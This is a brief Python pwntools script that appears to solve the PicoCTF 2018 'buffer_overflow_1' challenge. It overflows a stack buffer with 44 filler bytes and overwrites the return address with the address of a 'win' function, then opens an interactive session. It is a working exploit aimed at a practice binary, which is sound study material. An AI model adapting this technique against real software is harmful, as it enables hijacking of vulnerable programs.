from pwn import *

context(log_level='debug')

io=process("./PicoCTF_2018_buffer_overflow_1")
#io=remote("node3.buuoj.cn",29898)

win=0x80485cb

io.recv()
payload=b'A'*(0x28+0x4)+p32(win)

io.sendline(payload)

io.interactive()